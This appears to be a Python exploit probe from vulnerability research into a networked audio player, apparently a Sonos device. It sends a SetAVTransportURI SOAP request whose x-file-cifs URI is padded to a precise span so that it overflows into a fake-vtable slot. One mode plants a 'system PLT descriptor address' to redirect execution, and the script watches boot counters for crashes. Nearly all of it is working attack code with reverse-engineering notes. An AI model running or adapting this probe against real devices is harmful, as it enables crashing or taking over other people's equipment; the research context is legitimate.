#!/usr/bin/env python3
"""h14_probe.py — span-2139 NUL → fake-vtable bctrl probe (bead frankensonos-1w3).

Sends SetAVTransportURI with an x-file-cifs URI whose share-path span is exactly
2139 (the splitter saved-r31 slot) and whose decoded share-name carries chosen
bytes at decoded-offset 0x30..0x33 (the fake-vtable window at sp+0x1500).

usage: h14_probe.py <player-ip> <mode> [server-ip]
  mode=control   plain 2139-span, name bytes 0x30..0x33 = 'AAAA'
  mode=unmapped  name bytes 0x30..0x33 = 0x2f2f2f2f (unmapped fake vtable)
  mode=probe1    name bytes 0x30..0x33 = 0x105464b0-ish low-bytes encodable
Oracle: /status/zp before/after + GetTransportInfo + BootSeq change.
"""
import subprocess
import sys
import time
import urllib.request

player = sys.argv[1]
mode = sys.argv[2] if len(sys.argv) > 2 else "control"
SELF = sys.argv[3] if len(sys.argv) > 3 else "192.168.4.160"
PORT = 8902


def curl(url, timeout=8, out="/dev/null"):
    p = subprocess.run(["curl", "-s", "-m", str(timeout), "-o", out, "-w", "%{http_code}"] + [url], capture_output=True, text=True)
    return p.stdout.strip()


def soap(action, body):
    xml = ('<?xml version="1.0"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"'
           ' s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:%s'
           ' xmlns:u="urn:schemas-upnp-org:service:AVTransport:1">%s</u:%s></s:Body></s:Envelope>'
           % (action, body, action)).encode()
    req = urllib.request.Request(
        "http://%s:1400/MediaRenderer/AVTransport/Control" % player, xml,
        {"SOAPACTION": '"urn:schemas-upnp-org:service:AVTransport:1#%s"' % action,
         "Content-Type": 'text/xml; charset="utf-8"'})
    try:
        r = urllib.request.urlopen(req, timeout=8)
        return r.status, r.read()[:200]
    except Exception as e:
        return getattr(e, "code", 0), str(e)[:120].encode()


def bootseq():
    try:
        b = urllib.request.urlopen("http://%s:1400/status/zp" % player, timeout=2).read().decode()
        return b.split("<BootSeq>")[1].split("<")[0]
    except Exception:
        return "?"


def tstate():
    st, b = soap("GetTransportInfo", "<InstanceID>0</InstanceID>")
    try:
        return b.decode().split("<CurrentTransportState>")[1].split("<")[0]
    except Exception:
        return "?"


def pct(b):
    return "".join("%%%02x" % c for c in b)


# name decoded content: 0x30..0x33 = fake vtable pointer; pad to >= 0x34 decoded.
if mode == "unmapped":
    tail = bytes([0x2f, 0x2f, 0x2f, 0x2f])
elif mode == "probe1":
    tail = bytes([0x10, 0x54, 0x64, 0xb0])  # system PLT descriptor address
else:
    tail = b"AAAA"

# decoded name: 0x30 filler + tail at 0x30..0x33 + more filler (NUL-free)
decoded = b"a" * 0x30 + tail + b"b" * 8          # 0x38 = 56 bytes decoded
share_name = pct(decoded)                         # percent-encoded on the wire
# Span target: first '/' after host to last '/'. URI:
#   x-file-cifs://h/<share_name>/p<pad>/x.mp3
# span = 1 (slash after host) + len(share_name) + 1 + len("p<pad>") ... measured
# on the ENTRY buffer "x-file-cifs://host/NAME/pad/x.mp3": first '/' at index
# 14+1+1=16 ("x-file-cifs://" is 14, "h" then "/"), last '/' before x.mp3.
# span = last_slash_idx - first_slash_idx. Fix span=2139 by padding the pad part.
# We don't know the device's exact span rule for the leading "//" — so compute
# empirically: send a binary-searched pad. Simpler: make share_name itself the
# whole span: x-file-cifs://h/<NAME2136>/x.mp3 with len(NAME)=2136 percent-ENCODED
# chars? NO — span counts BUFFER bytes pre-decode? The entry buffer is built by
# FUN_101a000c via FUN_103897b8 from the file records (host, name) — the SPLITTER
# runs on the URI stored at obj+4212 by setter 0x101cbb38 = "uri prefix through
# first '/' after scheme". RE_COPY_AUDIT 2.1e proved: share name 2139 raw 'A's
# gives span 2139 → span counts RAW URI bytes (percent-encoded), not decoded.
# So: raw share segment of exactly 2139 bytes whose PERCENT-DECODED form puts
# 4 chosen bytes at decoded offset 0x30..0x33. Decoded length = 0x38: the raw
# segment = pct(56 bytes) BUT that raw length is 3*56=168, not 2139.
# → span comes from the WHOLE uri prefix; pad the HOST part? host is also
# percent-decoded into 0x10c0 (r27) — host decoded len unbounded? Keep host short;
# add a THIRD path component: x-file-cifs://h/<name56-pct>/p<PAD>/x.mp3 — the
# setter stores "uri prefix through first '/' after scheme" = "x-file-cifs://h"
# per 2.1c note ("host/share part"). Hmm — that prefix has NO span 2139.
#
# RE-READ 2.1e: "SetAVTransportURI with a 2139-byte share (x-file-cifs://host/<2139 A>/x.mp3,
# span 2139)" — so the setter stored a string whose first-to-last-slash distance is
# 2139 with the 2139 As in the middle. The stored string at obj+4212 = "uri prefix
# through first '/' after x-file-cifs://"... contradiction unless the stored string
# is the FULL URI. Trust the measured 2.1e: full URI with 2139-A share segment
# → span 2139 → copy runs. Follow that shape exactly:
pad = b"p" * 2100  # adjust so total first-to-last slash distance = 2139
# first '/' idx: "x-file-cifs://h" = 15 chars → first '/' at 15 (0-based).
# last '/' before x.mp3: 15 + 1 + len(pct(name)) + 1 + len(pad) = ...
# span = last - first. With name encoded len L1, pad len L2:
# span = (15 + 1 + L1 + 1 + L2) - 15 = L1 + L2 + 2 = 2139 → L2 = 2137 - L1.
L1 = len(share_name)
L2 = 2137 - L1
if L2 < 1:
    print("name too long; need L1 <= 2136", L1)
    sys.exit(1)
uri = "x-file-cifs://h/%s/%s/x.mp3" % (share_name, "p" * L2)
print("uri len", len(uri), "share_name(raw)", L1, "pad", L2, "expected span", L1 + L2 + 2)

boot0 = bootseq()
print("boot0", boot0, "state", tstate())
body = ('<InstanceID>0</InstanceID><CurrentURI>%s</CurrentURI>'
        '<CurrentURIMetaData></CurrentURIMetaData>' % uri)
st, resp = soap("SetAVTransportURI", body)
print("SetAVTransportURI", st)
soap("Play", "<InstanceID>0</InstanceID><Speed>1</Speed>")
time.sleep(3)
for i in range(6):
    alive = curl("http://%s:1400/status/zp" % player, 3)
    print("t+%d zp=%s state=%s boot=%s" % (i * 5, alive, tstate(), bootseq()), flush=True)
    time.sleep(5)
print("boot delta:", "RESTARTED" if bootseq() != boot0 else "same")
